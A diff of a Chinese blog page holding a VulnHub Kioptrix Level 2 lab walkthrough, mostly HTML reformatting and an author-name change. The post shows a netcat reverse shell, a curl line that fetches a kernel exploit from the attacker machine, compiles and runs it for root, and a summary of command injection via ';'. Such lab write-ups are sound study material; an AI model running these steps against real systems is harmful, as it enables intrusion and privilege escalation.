@@ -71,7 +71,7 @@
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc7hbaqxnfj317k0iqtgv.jpg">
 <meta property="article:published_time" content="2020-02-24T05:55:56.000Z">
 <meta property="article:modified_time" content="2021-08-06T03:57:45.424Z">
-<meta property="article:author" content="Dana Shaw">
+<meta property="article:author" content="肖坤稼">
 <meta property="article:tag" content="vulnhub靶机练习">
 <meta property="article:tag" content="Kioptix Level 2">
 <meta name="twitter:card" content="summary">
@@ -148,7 +148,8 @@
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
-        <p class="site-subtitle">为了去往别处</p>
+        <h1 class="site-subtitle" itemprop="description">为了去往别处</h1>
+      
   </div>
 
   <div class="site-nav-toggle">
@@ -223,9 +224,7 @@
     <i class="fa fa-search"></i>
   </span>
   <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="none"
-           placeholder="搜索..." spellcheck="false"
-           type="text" id="search-input">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="搜索..." spellcheck="false" type="text" id="search-input">
   </div>
   <span class="popup-btn-close">
     <i class="fa fa-times-circle"></i>
@@ -265,7 +264,7 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/./images/photo.jpg">
-      <meta itemprop="name" content="Dana Shaw">
+      <meta itemprop="name" content="肖坤稼">
       <meta itemprop="description" content="连尘埃也想收藏">
     </span>
 
@@ -273,9 +272,9 @@
       <meta itemprop="name" content="Dana Shaw's blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
+        <h2 class="post-title" itemprop="name headline">
           vulnhub靶机练习之Kioptix Level 2
-        </h1>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -350,11 +349,11 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nc -lvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">192.168.80.16: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.80.14] from (UNKNOWN) [192.168.80.16] 43719</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">bash-3.00$ whoami</span><br><span class="line">apache</span><br><span class="line">bash-3.00$ pwd</span><br><span class="line">/var/www/html</span><br></pre></td></tr></table></figure>
 <p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc7hbaqxnfj317k0iqtgv.jpg" alt="image.png"></p>
 <ul>
-<li>拓展知识（各种反弹shell的方法）<br><a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">参考</a><h2 id="找到内核漏洞"><a href="#找到内核漏洞" class="headerlink" title="找到内核漏洞"></a>找到内核漏洞</h2>从刚刚获取到的shell，我们看看靶机操作系统的内核信息，发现这个内核版本发行期是2007年，so old……<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ uname -a</span><br><span class="line">Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</span><br></pre></td></tr></table></figure>
-于是在<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/9545">网上</a>找到这个内核版本的漏洞利用方法。把这个漏洞利用脚本下载到攻击机：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ wget https://www.exploit-db.com/download/9545</span><br><span class="line">--2020-02-24 01:41:53--  https://www.exploit-db.com/download/9545</span><br><span class="line">Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8</span><br><span class="line">Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: unspecified [application/txt]</span><br><span class="line">Saving to: ‘9545’</span><br><span class="line"></span><br><span class="line">9545                           [ &lt;=&gt;                                   ]   9.55K  --.-KB/s    in 0s      </span><br><span class="line"></span><br><span class="line">2020-02-24 01:41:58 (25.7 MB/s) - ‘9545’ saved [9783]</span><br></pre></td></tr></table></figure>
+<li>拓展知识（各种反弹shell的方法）<br><a target="_blank" rel="external nofollow noopener noreferrer" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">参考</a><h2 id="找到内核漏洞"><a href="#找到内核漏洞" class="headerlink" title="找到内核漏洞"></a>找到内核漏洞</h2>从刚刚获取到的shell，我们看看靶机操作系统的内核信息，发现这个内核版本发行期是2007年，so old……<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ uname -a</span><br><span class="line">Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</span><br></pre></td></tr></table></figure>
+于是在<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.exploit-db.com/exploits/9545">网上</a>找到这个内核版本的漏洞利用方法。把这个漏洞利用脚本下载到攻击机：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ wget https://www.exploit-db.com/download/9545</span><br><span class="line">--2020-02-24 01:41:53--  https://www.exploit-db.com/download/9545</span><br><span class="line">Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8</span><br><span class="line">Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: unspecified [application/txt]</span><br><span class="line">Saving to: ‘9545’</span><br><span class="line"></span><br><span class="line">9545                           [ &lt;=&gt;                                   ]   9.55K  --.-KB/s    in 0s      </span><br><span class="line"></span><br><span class="line">2020-02-24 01:41:58 (25.7 MB/s) - ‘9545’ saved [9783]</span><br></pre></td></tr></table></figure>
 攻击机：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ mv 9545 exploit.c</span><br><span class="line">kali@kali:~$ sudo mv exploit.c /var/www/html/ #将漏洞利用脚本放到web目录</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">kali@kali:~$ /etc/init.d/apache2 start #开启apache服务</span><br><span class="line">Starting apache2 (via systemctl): apache2.service.</span><br></pre></td></tr></table></figure>
 靶机shell从攻击机下载exploit：<code>curl 192.168.80.14/exploit.c -o exploit.c</code>。运行这个exp即可获取到靶机root权限。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ cd /tmp &amp;&amp; id &amp;&amp; curl 192.168.80.14/exploit.c -o exploit.c 2&gt; /dev/null &amp;&amp; gcc exploit.c &amp;&amp; ./a.out</span><br><span class="line">uid=48(apache) gid=48(apache) groups=48(apache)</span><br><span class="line">exploit.c:376:28: warning: no newline at end of file</span><br><span class="line">sh: no job control in this shell</span><br><span class="line">sh-3.00# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
-<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><a target="_blank" rel="noopener" href="https://v3ded.github.io/ctf/kioptrix2.html">https://v3ded.github.io/ctf/kioptrix2.html</a><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>从这台靶机练习，主要学习怎么反弹shell。遇到简单的web登录界面，首先尝试万能密码是否能登入系统。<br>用户提交的内容是shell脚本（如：ping命令）这种情况，我们得明白<code>;</code>可以连接多个shell脚本，并且服务器会依次执行脚本。根据这个原理，我们把恶意脚本（如反弹shell的脚本）放到<code>;</code>后面，就可以欺骗服务器执行恶意脚本。<br>靶机的操作系统版本较低时，在网上找相关版本的内核漏洞，进行利用。</li>
+<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><a target="_blank" rel="external nofollow noopener noreferrer" href="https://v3ded.github.io/ctf/kioptrix2.html">https://v3ded.github.io/ctf/kioptrix2.html</a><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>从这台靶机练习，主要学习怎么反弹shell。遇到简单的web登录界面，首先尝试万能密码是否能登入系统。<br>用户提交的内容是shell脚本（如：ping命令）这种情况，我们得明白<code>;</code>可以连接多个shell脚本，并且服务器会依次执行脚本。根据这个原理，我们把恶意脚本（如反弹shell的脚本）放到<code>;</code>后面，就可以欺骗服务器执行恶意脚本。<br>靶机的操作系统版本较低时，在网上找相关版本的内核漏洞，进行利用。</li>
 </ul>
 
     </div>
@@ -367,21 +366,21 @@
 <div>
 <ul class="post-copyright">
   <li class="post-copyright-author">
-    <strong>本文作者： </strong>Dana Shaw
+    <strong>本文作者： </strong>肖坤稼
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
     <a href="https://dana5haw.com/posts/ZH-CN/Vulnhub_Kioptrix_Two.html" title="vulnhub靶机练习之Kioptix Level 2">https://dana5haw.com/posts/ZH-CN/Vulnhub_Kioptrix_Two.html</a>
   </li>
   <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
   </li>
 
   <div class="wechat_OA">
 	<span>欢迎关注我的公众号(Welcome to follow me on Wechat)</span>
 	<br>
     <!-- 这里添加你的二维码图片 -->
-	<img src ="https://v2ray.dana5haw.com:8008/images/2021/08/03/qrcode_for_gh_9b7280eb1edc_258.jpg">
+	<img src="https://v2ray.dana5haw.com:8008/images/2021/08/03/qrcode_for_gh_9b7280eb1edc_258.jpg">
 </div>
 
 </ul>
@@ -482,18 +481,17 @@
       <div class="post-toc-wrap sidebar-panel">
           <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B%E9%9D%B6%E6%9C%BA"><span class="nav-number">1.</span> <span class="nav-text">探测靶机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%89%AB%E6%8F%8F"><span class="nav-number">2.</span> <span class="nav-text">进一步扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#80%E7%AB%AF%E5%8F%A3%E5%8F%AF%E6%89%93%E5%BC%80%E7%BD%91%E9%A1%B5"><span class="nav-number">3.</span> <span class="nav-text">80端口可打开网页</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%8F%90%E4%BA%A4%E5%8A%9F%E8%83%BD%E5%8F%8D%E5%BC%B9%E9%9D%B6%E6%9C%BAshell"><span class="nav-number">4.</span> <span class="nav-text">利用提交功能反弹靶机shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%BE%E5%88%B0%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.</span> <span class="nav-text">找到内核漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E5%8D%9A%E6%96%87"><span class="nav-number">6.</span> <span class="nav-text">参考博文</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol></div>
       </div>
-        <div id="">
+        <div id>
 	  <canvas id="canvas" style="width:60%;">
-	    </div>
+	    </canvas></div>
 	      <script type="text/javascript" src="/js/canvas-dance-time.js"></script>
       <!--/noindex-->
 
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Dana Shaw"
-      src="/./images/photo.jpg">
-  <p class="site-author-name" itemprop="name">Dana Shaw</p>
+    <img class="site-author-image" itemprop="image" alt="肖坤稼" src="/./images/photo.jpg">
+  <p class="site-author-name" itemprop="name">肖坤稼</p>
   <div class="site-description" itemprop="description">连尘埃也想收藏</div>
 </div>
 <div class="site-state-wrap motion-element">
@@ -501,7 +499,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">255</span>
+          <span class="site-state-item-count">256</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -521,13 +519,13 @@
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-        <a href="https://github.com/DanaShaw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DanaShaw" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+        <a href="https://github.com/DanaShaw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DanaShaw" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
       </span>
       <span class="links-of-author-item">
-        <a href="mailto:danaxkj@gmail.com" title="E-Mail → mailto:danaxkj@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+        <a href="mailto:danaxkj@gmail.com" title="E-Mail → mailto:danaxkj@gmail.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
       </span>
       <span class="links-of-author-item">
-        <a href="https://weibo.com/u/5742631593" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5742631593" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+        <a href="https://weibo.com/u/5742631593" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5742631593" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
       </span>
       <span class="links-of-author-item">
         <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
@@ -542,7 +540,7 @@
     </div>
     <ul class="links-of-blogroll-list">
         <li class="links-of-blogroll-item">
-          <a href="https://whale3070.github.io/" title="https:&#x2F;&#x2F;whale3070.github.io&#x2F;" rel="noopener" target="_blank">windows提权学习</a>
+          <a href="https://whale3070.github.io/" title="https:&#x2F;&#x2F;whale3070.github.io&#x2F;" rel="external nofollow noopener noreferrer" target="_blank">windows提权学习</a>
         </li>
     </ul>
   </div>
@@ -589,7 +587,7 @@
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">Dana Shaw</span>
+  <span class="author" itemprop="copyrightHolder">肖坤稼</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
@@ -603,7 +601,7 @@
 </div>
 
 
-  <script src='https://unpkg.com/mermaid@/dist/mermaid.min.js'></script>
+  <script src="https://unpkg.com/mermaid@/dist/mermaid.min.js"></script>
   <script>
     if (window.mermaid) {
       mermaid.initialize({theme: 'default'});
@@ -645,7 +643,7 @@
 
   
   
-  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
   <script src="/lib/anime.min.js"></script>
   <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
   <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
@@ -668,6 +666,15 @@
 
 
   
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
 
 
 
@@ -724,15 +731,9 @@ NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
 });
 </script>
 
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3938956891324222"
-     crossorigin="anonymous"></script>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3938956891324222" crossorigin="anonymous"></script>
 <!-- sidebar -->
-<ins class="adsbygoogle"
-     style="display:block"
-     data-ad-client="ca-pub-3938956891324222"
-     data-ad-slot="6163650450"
-     data-ad-format="auto"
-     data-full-width-responsive="true"></ins>
+<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-3938956891324222" data-ad-slot="6163650450" data-ad-format="auto" data-full-width-responsive="true"></ins>
 <script>
      (adsbygoogle = window.adsbygoogle || []).push({});
 </script>
@@ -740,7 +741,7 @@ NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
   <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
   
   
-   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
    <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
    <script type="text/javascript" src="/js/fireworks.js"></script>
 
